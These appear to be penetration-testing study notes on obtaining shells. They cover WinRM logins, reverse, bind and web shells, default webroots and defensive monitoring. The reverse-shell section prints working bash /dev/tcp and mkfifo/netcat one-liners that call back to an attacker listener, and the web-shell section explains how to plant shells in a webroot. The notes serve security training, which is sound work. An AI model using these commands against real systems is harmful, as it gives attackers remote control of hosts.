# Shells & Payloads — Notes

## Why We Need a Shell

Once we've gained a foothold on a system (e.g., via enumeration and exploitation), we need a **reliable connection that gives us direct access to the system's shell** (Bash or PowerShell) to further enumerate the system or take control over it or its network.

## Remote Login via Native Protocols

One way to connect to a compromised system is through **existing network protocols**:

| Protocol | Platform | Purpose |
|---|---|---|
| SSH | Linux | Remote shell login |
| WinRM | Windows | Remote management/shell login |

### WinRM (Windows Remote Management)

- Microsoft's implementation of the **WS-Management protocol** — a SOAP-based protocol for remote management of Windows hosts.
- Runs over HTTP (default port **5985**) or HTTPS (default port **5986**).
- Allows running PowerShell commands/sessions remotely if valid credentials (and WinRM access) are available.
- Common usage:
  - `evil-winrm -i <target-ip> -u <user> -p <password>` — popular tool for interactive WinRM shells.
  - Requires WinRM service to be enabled and the account to be in the `Remote Management Users` group (or local admin).
- **Attacker perspective:** valuable post-exploitation access path if credentials are obtained (e.g., via phishing, credential dumping, password spraying) — often avoids needing a separate payload/listener since it uses legitimate remote-admin tooling.
- **Defender perspective:** restrict WinRM to trusted hosts/jump boxes, enforce strong auth (Kerberos vs. NTLM), monitor for anomalous WinRM logins (Event ID 91/142, 4624 Logon Type 3).

## Types of Shells

| Type | Description |
|---|---|
| **Reverse Shell** | Connects *back* to our system and gives us control through a reverse connection. |
| **Bind Shell** | *Waits* for us to connect to it and gives us control once we do. |
| **Web Shell** | Communicates through a web server; accepts commands via HTTP parameters, executes them, and prints back the output. |

---

## Reverse Shell

The most common type of shell — quickest and easiest way to obtain control over a compromised host.

### Example Commands

```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# Named-pipe (mkfifo) reverse shell — useful when /dev/tcp isn't available
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 > /tmp/f
```

The exact command depends on the compromised host's OS and available applications/binaries. **PayloadsAllTheThings** / **InternalAllTheThings** maintain comprehensive reverse shell cheatsheets:
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

### How It Works

1. The target executes the reverse shell command.
2. The shell (e.g., Bash) attempts to establish an **outbound TCP connection** to the attacker's listener.
3. The shell's **stdin/stdout/stderr** are redirected through that connection.
4. The attacker's machine can now interact with the shell directly (e.g., via a `netcat` listener: `nc -lvnp 1234`).

### Delivery

The reverse shell command is typically triggered through whatever exploit/access we already have — e.g., a Python exploit script, a Metasploit module, or command injection in a web app.

### Pros / Cons

| Normal/Defensive View | Attacker View |
|---|---|
| Outbound connections are often less restricted by firewalls than inbound — a common reason reverse shells succeed. | Quick and reliable way to get interactive access. |
| Fragile: if the shell process dies or the connection drops, access is lost until the exploit is re-triggered. | Must re-exploit the target to regain access if the connection drops — no persistence by itself. |
| Egress filtering / outbound firewall rules are a key mitigation. | Often paired with a **listener catch-all** or a more stable shell upgrade (e.g., `script`, `socat`, or a C2 implant) to reduce fragility. |

---

## Bind Shell

Instead of connecting *out* to the attacker, a bind shell **listens on the compromised host** and waits for the attacker to connect to it.

- Useful when outbound connections from the target are blocked/filtered but inbound access to a specific port is reachable.
- Attacker perspective: requires the target port to be reachable (not blocked by firewall/NAT) — less common in modern networks than reverse shells due to firewall rules typically blocking unsolicited inbound traffic.
- Defender perspective: monitor for unexpected listening ports / unauthorized services bound on hosts.

---

## Web Shell

A script (e.g., PHP, ASPX, JSP) placed on a web server that accepts commands via HTTP parameters, executes them on the host, and returns the output in the HTTP response.

### Uploading a Web Shell

To use a web shell, it must be placed in the target's **webroot** so it can be reached via the browser. This can happen via:
- An **upload feature vulnerability** (e.g., unrestricted file upload allowing `shell.php`).
- **Remote command execution** (RCE) from another exploit, used to write the shell file directly into the webroot (e.g., via `echo` or `curl`).

### Common Default Webroots

| Web Server | Default Webroot |
|---|---|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `C:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

### Advantages of a Web Shell

- **Bypasses firewall restrictions** — no new port is opened; traffic rides on the existing web port (80/443), blending in with normal HTTP traffic.
- **Survives reboots** — as long as the file remains on disk and the web service restarts, the shell is still accessible without re-exploiting the host.

### Defensive Notes

- Monitor webroots for unexpected/newly written files (file integrity monitoring).
- Restrict upload functionality to validated file types; disable script execution in upload directories.
- WAF rules and EDR can detect known web shell signatures and suspicious HTTP parameter patterns (e.g., `?cmd=`).

---

## Quick Comparison: Reverse vs. Bind vs. Web Shell

| Factor | Reverse Shell | Bind Shell | Web Shell |
|---|---|---|---|
| Connection direction | Target → Attacker | Attacker → Target | Attacker → Target (over HTTP/S) |
| Firewall-friendliness | Good (outbound often allowed) | Poor (inbound often blocked) | Excellent (uses existing web port) |
| Persistence across reboot | No (needs re-exploitation) | No | Yes (if file remains on disk) |
| Stealth | Moderate | Low | High (blends with HTTP traffic) |
